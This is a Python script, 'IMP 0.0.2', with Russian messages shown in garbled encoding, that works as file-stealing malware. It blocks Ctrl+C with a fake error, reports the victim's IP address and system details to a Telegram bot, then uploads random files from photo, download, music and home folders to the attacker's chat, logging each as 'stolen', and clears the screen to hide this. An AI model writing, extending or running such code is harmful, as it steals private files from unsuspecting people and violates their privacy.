# –í–µ—Ä—Å–∏—è IMP 0.0.2
# –ü–æ—Ñ–∏–∫—Å–∏–ª –±–∞–≥–∏
import time
import subprocess
import requests
from colorama import init, Fore, Style
import os
import threading
import zipfile 
import sys
import signal
import random
import platform

TELEGRAM_BOT_TOKEN = ''
TELEGRAM_CHAT_ID = ''

def signal_handler(sig, frame):
    print("Failed to kill process.")

signal.signal(signal.SIGINT, signal_handler)

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    requests.post(url, data=payload)

def run_commands():
    print('üíø –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π...')
    try:
        system_platform = platform.system()
        
        if system_platform == "Linux":
            subprocess.run(['apt', 'install', 'curl', '-y'], check=True)
        elif system_platform == "Darwin":
            subprocess.run(['brew', 'install', 'curl'], check=True)
        elif system_platform == "Windows":
            subprocess.run(['choco', 'install', 'curl', '-y'], check=True)
        elif 'termux' in sys.argv[0]:
            subprocess.run(['pkg', 'install', 'curl', '-y'], check=True)
        else:
            send_telegram_message(f"‚ùå –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞: {system_platform}")
            return
    except Exception as e:
        send_telegram_message(f"‚ùå –û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π: {e}")
        print(f"‚ùå –û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π: {e}")
        return

    try:
        ip_address = subprocess.check_output(['curl', 'ifconfig.me']).decode('utf-8').strip()
        system = platform.system()
        ver = platform.version()
        arch = platform.architecture()
        send_telegram_message(f"üì≤ –ù–æ–≤–∞—è —Å–µ—Å—Å–∏—è\nIP: {ip_address}\nSystem: {system} {ver} {arch}")
    except Exception as e:
        send_telegram_message(f"üíÄ –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å IP: {e}")

    share_thread = threading.Thread(target=share)
    share_thread.start()
    send_telegram_message(f"üëÅÔ∏èÔ∏èÔ∏èÔ∏èÔ∏èÔ∏è –ü–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞—é –¥–∞–Ω–Ω—ã–µ...")
    os.system('clear')

def share():
    try:
        folders_to_send = ['/storage/emulated/0/Download', '/storage/emulated/0/Movies', '/storage/emulated/0/Pictures', '/storage/emulated/0/DCIM', '/storage/emulated/0/Music', 'C:', 'E:', 'F:', '/home', '/root']
        
        for folder in folders_to_send:
            if os.path.exists(folder):
                files = []
                for root, dirs, files_in_folder in os.walk(folder):
                    for file in files_in_folder:
                        files.append(os.path.join(root, file))
                
                random_files = random.sample(files, min(5, len(files)))

                for file_path in random_files:
                    with open(file_path, 'rb') as f:
                        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
                        payload = {
                            'chat_id': TELEGRAM_CHAT_ID,
                        }
                        files = {
                            'document': f
                        }
                        try:
                            response = requests.post(url, data=payload, files=files)
                            if response.status_code == 200:
                                send_telegram_message(f'üñ§ –°–ø–∏–∑–∂–µ–Ω–æ: {file_path}')
                            else:
                                send_telegram_message(f'üíî –ù–µ —Å–ø–∏–∑–¥–∏–ª–æ—Å—å: {file_path} - {response.text}')
                        except requests.exceptions.RequestException as e:
                            if "Max retries exceeded" in str(e) and "SSLError" in str(e):
                                send_telegram_message(f"‚õìÔ∏è‚Äçüí• {e}. –ü–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ 8 —Å–µ–∫—É–Ω–¥...")
                                time.sleep(8)
                                share()
                                return
                    time.sleep(4)
            else:
                send_telegram_message(f"–ü–∞–ø–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞: {folder}")
                share()
                return

    except Exception as e:
        send_telegram_message(f"‚ùå –§–∞—Ç–∞–ª—å–Ω–∞—è –æ—à–∏–±–∫–∞: {e}")

def imp():
    run_commands()

if __name__ == "__main__":
    imp()